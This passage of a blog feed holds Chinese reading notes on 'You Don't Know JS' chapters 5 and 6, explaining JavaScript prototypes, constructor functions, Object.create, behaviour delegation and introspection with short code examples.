最终会指向null)。<br>这个 Object.prototype 对象，包含了 JavaScript 中许多通用的功能，例如:toString() ， valueOf()， hasOwnProperty(..)和 isPrototypeOf(..)。</p><h4 id="5-1-2-属性设置和屏蔽"><a href="#5-1-2-属性设置和屏蔽" class="headerlink" title="5.1.2 属性设置和屏蔽"></a>5.1.2 <strong>属性设置和屏蔽</strong></h4><p><strong>注意:</strong> 书中提到的动词<code>屏蔽</code>其实指的就是在对象上创建同名属性(原型链上已有该属性)。（好像不是很重要，以后抽时间再看）</p><p><img src="https://user-gold-cdn.xitu.io/2018/11/25/1674b5220c3a82ce%EF%BC%9Fw=1375&h=962&f=png&s=207062"></p><h3 id="5-2-“类”"><a href="#5-2-“类”" class="headerlink" title="5.2 “类”"></a>5.2 “类”</h3><ul><li>JavaScript里只有对象，没有类！</li><li>JavaScript不需要通过类来抽象对象，而是自己直接创建对象，并定义对象的行为。</li></ul><h4 id="5-2-1-“类”函数"><a href="#5-2-1-“类”函数" class="headerlink" title="5.2.1 “类”函数"></a>5.2.1 <strong>“类”函数</strong></h4><p><strong>“类”函数:</strong> JavaScript用来模仿类的函数就被称为类函数，其实就是我们常说的构造函数。        </p><p><strong>“类”函数模拟类的关键:</strong> 所有的函数默认都会拥有一个名为 prototype 的公有并且不可枚举的属性，它会指向另一个对象。当我们通过new 函数来得到实例对象时，此时new会给实例对象一个内部的 [[Prototype]]属性，实例对象内部的[[Prototype]]属性与构造函数的prototype属性都指向同一个对象。那JS的这个特性怎么模拟类呢？首先<strong>类的本质就是复制！</strong>我们可以将类里的属性放在函数的prototype属性里，这样该函数的实例对象就可以通过<a href="%E5%8E%9F%E5%9E%8B%E9%93%BE">[Prototype]</a>访问这些属性。这种行为称为原型继承。这样就实现了伪”复制”，可以达到和类相似的效果.</p><p><strong>注意:</strong> 虽然说所有的函数默认都会拥有一个名为 prototype属性，但也有特殊的时候就是通过bind()硬绑定时所返回的<strong>绑定函数，它是没有prototype属性的!</strong></p><p><strong>图解真正的类与JS的模拟类:</strong></p><p><img src="https://user-gold-cdn.xitu.io/2018/11/25/1674b57bbca1ee25%EF%BC%9Fw=523&h=523&f=png&s=68402"></p><p><strong>关于原型继承这个名字的疯狂吐槽:</strong>      作者的吐槽主要集中在”继承”两个字，原因是在面向类的语言中，”继承”意味着复制，但在JavaScript里原型继承却根本不是这个意思，它并没有复制，而是用原型链来实现。</p><h4 id="5-2-2-“构造函数”"><a href="#5-2-2-“构造函数”" class="headerlink" title="5.2.2 “构造函数”"></a>5.2.2 <strong>“构造函数”</strong></h4><p>构造函数之所以是构造函数，是因为它<strong>被new调用</strong>，如果没被new调用，它就是一个普通函数。实际上，new会劫持所有普通函数并用构造对象的形式来调用它，并且无论如何都会构造返回一个对象。</p><h4 id="5-2-3-技术"><a href="#5-2-3-技术" class="headerlink" title="5.2.3 技术"></a>5.2.3 <strong>技术</strong></h4><p><strong>prototype.constructor:</strong><br>一个对象访问constructor时，会<strong>默认访问其原型对象</strong>上的constructor属性。</p><p><img src="https://user-gold-cdn.xitu.io/2018/11/25/1674b5a12dfc7024%EF%BC%9Fw=573&h=463&f=png&s=87705"></p><p><strong>注意:</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* .. */</span> &#125;</span><br><span class="line">Foo.prototype = &#123; <span class="comment">/* .. */</span> &#125;; <span class="comment">// 有时候我们会需要创建一个新原型对象，因此也不会有默认的constructor属性指向构造函数</span></span><br><span class="line"><span class="comment">// 需要在 Foo.prototype 上“修复”丢失的 .constructor 属性</span></span><br><span class="line"><span class="comment">// 关于 defineProperty(..)，参见第 3 章 </span></span><br><span class="line"><span class="built_in">Object</span>.defineProperty( Foo.prototype， <span class="string">&quot;constructor&quot;</span> ， &#123;</span><br><span class="line">  <span class="attr">enumerable</span>: <span class="literal">false</span>，<span class="comment">//不可枚举</span></span><br><span class="line">  <span class="attr">writable</span>: <span class="literal">true</span>，</span><br><span class="line">  <span class="attr">configurable</span>: <span class="literal">true</span>，</span><br><span class="line">  <span class="attr">value</span>: Foo <span class="comment">// 让 .constructor 指向 Foo</span></span><br><span class="line">&#125; );</span><br><span class="line"><span class="comment">//上面这种方法是比较严谨，也比较麻烦的.并且使用Object.defineProperty()风险是很大的.</span></span><br><span class="line"><span class="comment">//所以我们实际是这样修改的</span></span><br><span class="line">Foo.prototype.constructor=Foo; <span class="comment">//直接将其赋值Foo 唯一要注意的是此时constructor是可枚举的.会被实例对象的for..in..遍历到.</span></span><br></pre></td></tr></table></figure><h3 id="5-3-原型-继承"><a href="#5-3-原型-继承" class="headerlink" title="5.3 (原型)继承"></a>5.3 (原型)继承</h3><p><strong>原型对象到原型对象的继承:</strong><br>例如:Bar.prototype 到 Foo.prototype 的委托关系，<br>正确的JavaScript中“原型风格”:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line">Foo.prototype.myName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Bar</span>(<span class="params">name，label</span>) </span>&#123; </span><br><span class="line">  Foo.call( <span class="built_in">this</span>， name ); </span><br><span class="line">  <span class="built_in">this</span>.label = label;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们创建了一个新的 Bar.prototype 对象，并且它的[[Prototype]] 关联Foo.prototype </span></span><br><span class="line">Bar.prototype = <span class="built_in">Object</span>.create( Foo.prototype );</span><br><span class="line"><span class="comment">// 注意!Object.create()是返回一个新的对象，所以现在没有 Bar.prototype.constructor 了 </span></span><br><span class="line"><span class="comment">// 如果你需要这个属性的话可能需要手动修复一下它</span></span><br><span class="line">Bar.prototype.myLabel = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">this</span>.label;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> Bar( <span class="string">&quot;a&quot;</span>， <span class="string">&quot;obj a&quot;</span> );</span><br><span class="line"></span><br><span class="line">a.myName(); <span class="comment">// &quot;a&quot;</span></span><br><span class="line">a.myLabel(); <span class="comment">// &quot;obj a&quot;</span></span><br></pre></td></tr></table></figure><p>错误用法:</p><ul><li> <code>Bar.prototype = Foo.prototype;</code> 此时并不会创建一个关联到 Bar.prototype 的新对象，它只是让 Bar.prototype 直接引用 Foo.prototype 对象。 因此当你执行类似 Bar.prototype. myLabel = … 的赋值语句时会直接修改 Foo.prototype 对象本身。</li><li> <code>Bar.prototype = new Foo();</code> 它使用 了 Foo(..) 的“构造函数调用”，如果函数 Foo 有一些其他操作的话，尤其是与this有关的的话，就会影响到 Bar() 的“后代”，后果不堪设想。</li></ul><p><strong>结论:</strong> 要创建一个合适的关联对象，我们<strong>需使用 Object.create(..)</strong> 而不是使用具有副作用的 Foo(..)。这样做唯一的缺点就是需要创建一个新对象然后把旧对象抛弃掉(主要是需要手动设置constructor)，不能直接修改已有的默认对象。</p><p><strong>检查”类”关系</strong>        </p><ul><li><strong>instanceof 操作符</strong>: 验证左边的普通对象的整条[[prototype]]链是否有指向右边函数的prototype，例如:<code>a instanceof Foo</code>。</li><li><strong>isPrototypeOf(..)  方法</strong>: 验证在对象 a 的整条 [[Prototype]] 链中是否出现过 原型对象b.例如:<code>b.isPrototypeOf( a );</code></li></ul><p><strong>注意:</strong> 如果使用内置的 .bind(..) 函数来生成一个<strong>硬绑定函数</strong>(参见第 2 章)的话， 该函数<strong>是没有 .prototype 属性的</strong>。如果硬绑定函数instanceof 的话，则其bind的 目标函数的prototype会成为硬绑定函数的prototype.</p><p><strong>关于__proto__</strong>:<br>我们知道函数可以直接通过prototype属性直接访问原型对象。那怎么访问呢？<br>在ES5之中的标准方法:通过Object.getPrototypeOf(  )方法来获取对象原型.<code>Object.getPrototypeOf( a ) === Foo.prototype; // true</code>，<br>另一种方法:在 ES6 之前并不是标准，但却被绝大多数浏览器支持的一种方法，可以访问内部[[prototype]]对象.那就是<code>__proto__</code>.例如:<code>a.__proto__ === Foo.prototype; // true</code>。你甚至可以通过<code>.__proto__.__ptoto__... </code>来访问整个原型链。  <code>.__proto__ </code>实际上并不存在于你正在使用的对象中，并且它看起来很像一个属性，但是实际上它更像一个 getter/setter(见第三章)。</p><h3 id="5-4-对象关联"><a href="#5-4-对象关联" class="headerlink" title="5.4 对象关联"></a>5.4 对象关联</h3><p>[[Prototype]] 机制就是存在于对象中的一个内部链接，<strong>它会引用其他对象。</strong></p><p>这个链接的作用是:如果在对象上没有找到需要的属性或者方法引用，引擎就会继续在 [[Prototype]] 关联的对象上进行查找。同理，如果在后者中也没有找到需要的引用就会继续查找它的 [[Prototype]]，以此类推。这一系列对象的链接被称为<strong>原型链</strong>。</p><h4 id="5-4-1-创建关联"><a href="#5-4-1-创建关联" class="headerlink" title="5.4.1 创建关联"></a>5.4.1 <strong>创建关联</strong></h4><p><strong>问:</strong>“我们已经明白了为什么 JavaScript 的 [[Prototype]] 机制和类不一样，也明白了它如何建立对象间的关联。”<br><strong>答:</strong> 类的机制是复制，JavaScript里原型链的机制是引用.    </p><p><strong>问:</strong>“那 [[Prototype]] 机制的意义是什么呢？为什么 JavaScript 开发者费这么大的力气(模拟类)在代码中创建这些关联呢？”<br><strong>答:</strong> 意义就是模拟类，JavaScript不需要复制而通过原型链实现”实例”对”类”的”继承(其实就是引用)”，这样就达到了实例对象对某些属性的复用.</p><p><strong><code>Object.create(..)</code></strong><br>“Object.create(..) 会创建一个新对象(bar)并把它关联到我们指定的对象(foo)，这样我们就可以充分发挥 [[Prototype]] 机制的威力(委托)并且避免不必要的麻烦(比如使用 new 的构造函数调用会生成 .prototype 和 .constructor 引用)。”实际上这个方法就是创建返回一个新对象，这个新对象的原型([[Prototype]])会绑定为我们输入的参数对象foo，并且由于不是通过构造函数的形式，所以不需要为函数单独设置prototype。虽然Object.create(..)很好，但实际我们使用的更多的还是构造函数形式.<br><strong>注意:</strong>  Object.create(..) 的第二个参数指定了需要添加到新对象中的属性名以及这些属性的属性描述符(参见第 3 章)。</p><p><strong><code>Object.create(null)</code></strong><br>“Object.create(null) 会创建一个拥有空[[Prototype]] 链接的对象，这个对象无法进行委托。由于这个对象没有原型链，所以 instanceof 操作符无法进行判断，因此总是会返回 false。 <strong>这些特殊的空 [[Prototype]] 对象通常被称作“字典”，它们完全不会受到原型链的干扰，因此非常适合用来存储数据。</strong>“</p><h4 id="5-4-2-关联关系是备用"><a href="#5-4-2-关联关系是备用" class="headerlink" title="5.4.2 关联关系是备用"></a>5.4.2 <strong>关联关系是备用</strong></h4><p><strong>[[Prototype]] 的本质作用:</strong>      “处理“缺失”属性或者方法时的一种备用选项。”(即备用设计模式).但随后进行了否定”但是这在 JavaScript 中并不是很常见。所以如果你使用的是这种模式，那或许应当退后一步并重新思考一下这种模式是否合适。” 作者给出的观点是:”进行委托设计模式，即例子中的内部委托(就是在对象里套了个壳再引用了一遍，为的是将委托进行隐藏).这样可以使我们的API设计得更加清晰.”文中的清晰是指，当我们需要引用原型对象的属性方法时，我们在对象内部设置对应专门的属性(例子中的doCool)，进行内部委托(其实就是套个壳进行隐藏).这样我们<strong>对象的属性就是”完整”的.</strong></p><p>在实际工作中，我们常常就是把原型对象作为存放对象的公共属性方法的地方.对于一般比较重要的操作才会在对象里进行内部委托(隐藏委托)!</p><h3 id="5-5-小结"><a href="#5-5-小结" class="headerlink" title="5.5 小结"></a>5.5 小结</h3><ul><li>如果要访问对象中并不存在的一个属性，**[[Get]] 操作(参见第 3 章)就会查找对象内部[[Prototype]] 关联的对象。** 这个关联关系实际上定义了一条“原型链”(有点像嵌套的作用域链)，在查找属性时会对它进行遍历。</li><li><strong>所有普通对象都有内置的 Object.prototype，</strong> 指向原型链的顶端(比如说全局作用域)，如 果在原型链中找不到指定的属性就会停止。toString()、valueOf() 和其他一些通用的功能 都存在于 Object.prototype 对象上，因此语言中所有的对象都可以使用它们。</li><li>关联两个对象最常用的方法是使用 new 关键词进行函数调用，在调用的 4 个步骤(第 2 章)中会创建一个关联其他对象的新对象。</li><li>使用 new 调用函数时会把新对象的 .prototype 属性关联到“其他对象”(就是构造函数prototype所指的对象)。带 new 的函数调用 通常被称为“构造函数调用”，尽管它们实际上和传统面向类语言中的类构造函数不一样。</li><li>JavaScript 中的机制有一个核心区别，那就是不会进行复制，对象之间是通过内部的 [[Prototype]] 链关联的。</li><li>“委托”是一个更合适的术语，因为对象之间的关系不是复制而是委托。</li></ul><h2 id="第六章-行为委托"><a href="#第六章-行为委托" class="headerlink" title="第六章 行为委托"></a>第六章 行为委托</h2><p>第 5 章的结论:[[Prototype]] 机制就是指对象中的一个内部链接引用另一个对象。换句话说，JavaScript 中这个机制的本质就是对象之间的关联关系。在第六章又被称为委托.<br>PS:前面在讲原型的时候我就习惯用父对象指代原型对象(类似”父类”)，用子对象指代其实例对象(类似”子类”).本章也将采用这种称呼，故下面不再说明.(其实我觉得用父对象和子对象称呼更形象)</p><h3 id="6-1-面向委托的设计"><a href="#6-1-面向委托的设计" class="headerlink" title="6.1 面向委托的设计"></a>6.1 面向委托的设计</h3><p>一句话:[[Prototype]]机制是面向委托的设计，是不同于面向类的设计. 下面将分别介绍类理论和委托理论.</p><h4 id="6-1-1-类理论"><a href="#6-1-1-类理论" class="headerlink" title="6.1.1 类理论"></a>6.1.1 <strong>类理论</strong></h4><p><strong>类理论设计方法:</strong> 首先定义一个通用父(基)类，在 父类类中定义所有任务都有(通用)的行为。接着定义子类 ，它们都继承自 父类并且会添加一些特殊的行为来处理对应的任务，并且在继承时子类可以使用方法重写(和多态)父类的行为.        </p><p>类理论中许多行为可以<strong>先“抽象”到父类然后再用子类进行特殊化(重写)。</strong><br>ps:这部分了解即可，着重理解下面JavaScript用到的委托.</p><h4 id="6-1-2-委托理论"><a href="#6-1-2-委托理论" class="headerlink" title="6.1.2 委托理论"></a>6.1.2 <strong>委托理论</strong></h4><p><strong>类理论设计方法:</strong> 首先你会定义一个”父”对象(相当于上节中的父类)，它会包含所有任务都可以使用(委托)的具体行为。接着，对于<strong>每个任务</strong>你都可以定义一个对象(“子”对象)来存储对应的数据和行为。你可以把特定的任务对象都关联到父对象上，让它们在需要的时候可以进行委托。    (其实我们一般都是用父对象来定义通用的方法，子对象进行委托.然后子对象自身个性的属性方法就写在子对象本身，并避免与父对象的属性名冲突)        </p><p><strong>ps:</strong> 这节书中这段话<code>但是我们并不需要把这些行为放在一起，**通过类的复制**，我们可以把它们分别放在各自独立 的对象中，需要时可以允许 XYZ 对象委托给 Task。</code>有个错误.”通过类的复制”应该改为”通过”[[Prototype]]机制”.这里应该是作者的手误.<br>在 JavaScript 中，[[Prototype]] 机制会把对象关联到其他对象。无论你多么努力地说服自 己，JavaScript 中就是没有类似“类”的抽象机制。(其实主要原因还是是JavaScript没有完整的复制机制)</p><p><strong>委托理论的使用建议:</strong><br>PS:书中这里写了3条，其实只有2条，第三条不过是对第一条的说明，这里我进行了合并.</p><ul><li><ol><li>通常来说，在 [[Prototype]] 委托中最好<strong>把状态保存在委托者(子对象)而不是委托目标(父对象)上</strong>。那怎么实现呢，就是通过”this 的隐式绑定”.<strong>在委托目标(父对象)上的函数里通过this定义保存状态</strong>.当委托者(子对象)引用该函数方法时，此时的this就自动绑定到委托者上了.</li></ol></li><li><ol start="2"><li> 在委托中我们会尽量避免在 [[Prototype]] 链的不同级别中使用相同的命名，否则就需要使用笨拙并且脆弱的语法来消除引用歧义(参见第 4 章)。</li></ol></li><li><strong>补充</strong>: 3. 在 API 接口的设计中，<strong>委托最好在内部实现，不要直接暴露出去。</strong> 这么做更多的是出于安全和接口稳定的考虑.建议<strong>子对象将所有引用父对象的方法都套个函数隐藏起来，并取一个语义化的属性名.</strong></li></ul><p><strong>委托理论的使用注意:</strong></p><ul><li><ol><li><strong>禁止两个对象互相委托</strong>:当你将第二个对象反向委托给前一个对象时，就会报错.</li></ol></li><li><ol start="2"><li><strong>调试</strong>: 这个了解下就行.知道不同浏览器和工具对委托的解析结果并不一定相同.(吐槽:看了半天到后面出现<code>实际上，在编写本书时，这个行为被认定是 Chrome 的一个 bug， 当你读到此书时，它可能已经被修复了。</code>我只想说WTF! 好吧，我知道chrome以前可能出现过这个”bug”了=.=)</li></ol></li></ul><h4 id="6-1-3-比较思维模型"><a href="#6-1-3-比较思维模型" class="headerlink" title="6.1.3 比较思维模型"></a>6.1.3 <strong>比较思维模型</strong></h4><p>这节主要是比较了”通过构造函数(模拟类)实现原型继承”与”通过对象关联(委托形式，Object.create( … ))实现原型继承”两种方式的区别.</p><p><strong>结论:</strong> 通过对象关联，委托形式，更加简洁，更加清晰易懂.</p><p>PS:这里我原本自己对例子画出原型示意图.但是发现是真的复杂，并且和书中简洁后的示意图是差不多的，所以这里就不展示了，免得让读者看得更头大.这里建议，读者自己在草稿纸上画出原型示意图.</p><h3 id="6-2-类与对象"><a href="#6-2-类与对象" class="headerlink" title="6.2 类与对象"></a>6.2 类与对象</h3><p>其实这节讲得还是”通过构造函数(模拟类)实现原型继承”与”通过对象关联(委托形式，Object.create( … ))实现原型继承”两种方式的区别.不过这次主要是以前端实际使用场景进行讲解.</p><h4 id="6-2-1-控件“类”"><a href="#6-2-1-控件“类”" class="headerlink" title="6.2.1 控件“类”"></a>6.2.1 <strong>控件“类”</strong></h4><p>这里我就不以书中的例子进行讲解了，而是直接站在更高的角度对这种”类”风格的代码进行讲解.<br><strong>最大特点:</strong> 1是通过构造函数进行模拟类，2是通过显式伪多态(硬绑定函数)关联两个函数.<br><strong>注意:</strong> </p><ul><li><strong>不管是类还是对象.这两种形式一般都需要定义两种数据.第一种就是实例对象要用到的”初始保存的数据”;第二种就是通用行为的定义，包括对实例对象数据的增删改查.</strong></li><li>下面提到的显式伪多态(详见第四章)，其实指的就是使用call()方法这种硬绑定.</li><li>注意ES6 class模拟类的写法我就没具体列出了.实际上class 仍然是通过 [[Prototype]] 机制实现的，不过是个表面简洁的语法糖.</li></ul><p><img src="https://user-gold-cdn.xitu.io/2018/11/25/1674b5e847b943c0%EF%BC%9Fw=1002&h=717&f=png&s=117669"></p><p>虽然书中对显式伪多态称为”丑陋的”，还用了一个语气动词”呸!”.虽然这样不好，但有时用call真的很方便，所以用得也很多.</p><h4 id="6-2-2-委托控件对象"><a href="#6-2-2-委托控件对象" class="headerlink" title="6.2.2 委托控件对象"></a>6.2.2 <strong>委托控件对象</strong></h4><p><strong>最大特点:</strong> 通过对象载体来模拟父子，并<strong>通过Object，create(…)来对两个对象进行关联</strong>.并<strong>通过委托的形式进行引用</strong>.与上节中提到的类形式还有一个区别:对象foo构建后，需要手动调用setUp方法进行初始化.故对象的构建与初始化是分开的.而构造函数形式则是在new 构造函数时， 同时进行了对象构建与初始化.(关于这点我下面还会再说明的)</p><p><img src="https://user-gold-cdn.xitu.io/2018/11/25/1674b604328156c9%EF%BC%9Fw=789&h=822&f=png&s=132960"></p><p>关于书中这句<code>使用类构造函数的话，你需要(并不是硬性要求，但是强烈建议)在同一个步骤中实现构造和初始化。然而，在许多情况下把这两步分开(就像对象关联代码一样)更灵活。</code>的理解:使用类构造函数形式，当我们使用<code>new 构造函数</code>时，其实是在<strong>一步实现</strong>对象的构建和对象数据的初始化(通过构造函数里的call) ;使用这种委托形式，我们是分别通过<code>Object.create( ... );</code>构建对象和<code>foo.setUp( ...);</code>来初始化的.即我们是分两步实现的.这样分开的话其实是更加灵活，也更符合编程中的关注分离原则.</p><h3 id="6-3-更简洁的设计"><a href="#6-3-更简洁的设计" class="headerlink" title="6.3 更简洁的设计"></a>6.3 更简洁的设计</h3><p>这节也是一样通过两者的对比来突显委托设计模式的各种优点.这里我就不再对书中的例子进行解读.如果你真正理解了类和委托的话，其实是很简单的.如果觉得复杂的话，可以在纸上理一下函数和对象之间的关系，下面我就只总结下这里提到委托设计模式的优点，当然核心是更简洁.</p><p><strong>简洁体现在:</strong></p><ul><li>1， 委托重点在于只需要两个实体(两个对象相互关联)，而之前的”类”模式需要三个(父”类”，子”类”，实例对象)其实可以这么理解:委托模式将”子类”和”实例对象”合为一个对象了。</li><li>2， 不需要基类(父类)来”共享”两个实体之间的行为.不需要实例化类，也不需要合成.其实这第二条就是对第一条这种结果的说明.</li><li>额外补充强调:在使用构造函数模拟类时，子类通常会对父类的行为进行重写(属性名相同);但委托模式则不会，它会重新取个属性名，再引用父对象上的行为.</li></ul><h3 id="6-4-更好的语法"><a href="#6-4-更好的语法" class="headerlink" title="6.4 更好的语法"></a>6.4 更好的语法</h3><p>这节主要是介绍ES6提供的2个简洁写法与其中的隐患.</p><p><strong>语法:</strong></p><ul><li>在 ES6 中我们可以在任意对象的字面形式中使用简洁方法声明，例如:</li></ul> <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">var</span> Foo = &#123;</span><br><span class="line">  <span class="function"><span class="title">bar</span>(<span class="params"></span>)</span> &#123; <span class="comment">/*..*/</span> &#125;，<span class="comment">//字面形式声明</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>在 ES6 中我们可以用 Object. setPrototypeOf(..) 来修改对象的 [[Prototype]]，具体用法可以<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/setPrototypeOf">查看MDN</a>例如:</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用更好的对象字面形式语法和简洁方法 </span></span><br><span class="line"><span class="keyword">var</span> AuthController = &#123;</span><br><span class="line">         <span class="attr">errors</span>: []，</span><br><span class="line">         <span class="function"><span class="title">checkAuth</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">           <span class="comment">// ... </span></span><br><span class="line">         &#125;，</span><br><span class="line">         <span class="function"><span class="title">server</span>(<span class="params">url，data</span>)</span> &#123;</span><br><span class="line">             <span class="comment">// ...</span></span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">// ... </span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 现在把 AuthController 关联到 LoginController </span></span><br><span class="line"><span class="built_in">Object</span>.setPrototypeOf( AuthController， LoginController );</span><br></pre></td></tr></table></figure><p><strong>弊端:</strong></p><ul><li><strong>对象字面形式语法</strong>:实际上就是一个匿名函数表达式.匿名函数会导致3个缺点:1. 调试栈更难追踪;2. 自我引用(递归、事件(解除)绑定，等等)更难; 3. 代码(稍微)更难理解。(其实我觉得这3个缺点还好，影响不是那么大).但是这种简洁语法很特殊，会给对应的函数对象设置一个内部的 name 属性，这样理论上可以用在追 踪栈中。所以实际上唯一的弊端就只剩第2条了.终极建议就是:如果你需要自我引用的话，那最好使用传统的具名函数表达式来定义对应的函数，不要使用简洁方法。</li><li><strong>Object. setPrototypeOf(..)</strong>  这个是书中没有提的，我觉得有必要进行补充下.首先，Object. setPrototypeOf(..)可能会带来性能问题，如果关心性能，则应该使用Object.create()替代.<strong>Object. setPrototypeOf(..)与Object.create()的主要区别</strong>: Object. setPrototypeOf(..)会直接修改现有对象的[[prototype]]，Object.create()则是返回一个新对象.所以你需要手动设置一下丢失的的constructor属性(如果你需要的话).而使用setPrototypeOf(..)则不需要.</li></ul><h3 id="6-5-内省"><a href="#6-5-内省" class="headerlink" title="6.5 内省"></a>6.5 内省</h3><p><strong>吐槽:</strong> 纵观整本书，作者关于JavaScript中模拟类和继承”的批评，说它们具有很大误导性!更是嗤之以鼻!就差爆粗口了，JavaScript就像一个异教徒，应该绑在十字架上被烧死!但是他这样的观点，都是站在其他语言的角度来看待时，产生的.我想更多的读者可能是只接触过JavaScript.那么他其实是没有这些疑惑的!!!你反而给他们讲这一大堆其他语言的”正确”含义，有时候会时得其反!让读者更加困惑，如果是理解不透彻的，反而会怀疑自己本来写的是对的代码!所以读者应该做一个可以理解作者意图，并且拥有自我见解和观点立场!</p><p><strong>什么是内省(自省)？</strong><br>首先，本节需要弄懂一个问题，什么是内省，或者是自省。书中的解释是<code>自省就是检查实例的类型。类实例的自省主要目的是通过创建方式来判断对象的结构和功能。</code>我这里再更通俗地解释下:当我们构建得到一个实例对象时，有时候我们是不太清除它的属性和方法的.尤其是第三方库.有时候贸然使用会导致很多错误(例如调用的方法不存在，或者报错等).这个时候我们就需要通过自省.其实就是通过一系列操作，来确认实例是不是我们想要的那个，实例的方法是不是我们想要的(存在且可用).</p><p><strong>内省的方法:</strong></p><ul><li><strong>1.通过 instanceof 语法:</strong></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line">Foo.prototype.something = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ... </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a1 = <span class="keyword">new</span> Foo();</span><br><span class="line"><span class="comment">// 假设我们不知道上面的过程，只知道得到实例对象a1</span></span><br><span class="line"><span class="comment">//我们想知道a1是不是我所希望的函数Foo所构建的</span></span><br><span class="line"><span class="keyword">if</span> (a1 <span class="keyword">instanceof</span> Foo) &#123; </span><br><span class="line">  a1.something();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例子中我们有一个实例对象a1，但是我们不知道a1是不是我们所希望的函数Foo所构造的，此时就可以通过<code>instanceof</code>进行判断.        <code>instanceof</code>比较适合判断实例对象和构造函数之间的关系.<br><strong>缺陷:</strong> 但是如果我们想判断函数A是不是函数B的”子类”时，则会稍微麻烦点，我们需要像这样<code>A.prototype instanceof B</code>进行判断.并且也不能直接判断两个对象是否关联.</p><ul><li><strong>2.通过 “鸭子类型”:</strong> 为什么会叫这个名字？看了作者的解释，还是不太能接受.不太理解外国人的脑回路.你在国内和别人说”鸭子类型”，估计也是一脸懵逼.其实很简单，所谓的”鸭子类型”其实也是我们实际工作中常用的:</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//如果a1的something存在的话，则我们可以进行调用</span></span><br><span class="line"><span class="keyword">if</span> ( a1.something) &#123; </span><br><span class="line">  a1.something();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这种方法是非常常用的，排除了在不知道存在性情况下，贸然调用的风险.<br><strong>缺陷:</strong> 关于书中提到的缺点，四个字概括就是”以偏概全” .书中关于Promise的例子，就是以偏概全的例子.所以我们在使用时，在if判断a1.something存在时，才会在后面使用something方法.不要直接使用anotherthing，这种没确认过的方法.</p><ul><li><strong>3.如果使用对象关联时:</strong> 则可以比较简单的使用<code>Object.getPrototypeOf(..)</code>进行判断.例如<code>Object.getPrototypeOf(a)===A</code>其中a，A都是对象.如果为true，则说明a的原型链上含有对象A.</li></ul><h3 id="6-6-小结"><a href="#6-6-小结" class="headerlink" title="6.6 小结"></a>6.6 小结</h3><ul><li>除了类和继承设计模式，行为委托其实是更强大，更值得推广的模式(本观点仅代表作者的观点!)</li><li>行为委托认为对象之间是兄弟关系，互相委托，而不是父类和子类的关系。JavaScript 的 [[Prototype]] 机制本质上就是行为委托机制。(我觉得还是父子对象关系.我的解说里也都是父子相称)</li><li>当你只用对象来设计代码时，不仅可以让语法更加简洁，而且可以让代码结构更加清晰。</li><li>对象关联(对象之前互相关联)是一种编码风格，它倡导的是直接创建和关联对象，不把它们抽象成类。对象关联可以用基于 [[Prototype]] 的行为委托非常自然地实现   </li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本文是阅读《你不知道的Javascript》（上）的笔记，大部分内容借鉴了&lt;a href=&quot;https://juejin.cn/post/6</summary>
      
    
    
    
    <category term="阅读笔记" scheme="https://asura1211.github.io/categories/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="JavaScript" scheme="https://asura1211.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>【阅读笔记】— — ECMAScript6入门</title>
    <link href="https://asura1211.github.io/2021/06/24/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20ECMAScript6%E5%85%A5%E9%97%A8/"/>
    <id>https://asura1211.github.io/2021/06/24/%E3%80%90%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20ECMAScript6%E5%85%A5%E9%97%A8/</id>
    <published>2021-06-24T21:28:32.000Z</published>
    <updated>2021-10-13T05:43:32.550Z</updated>
    
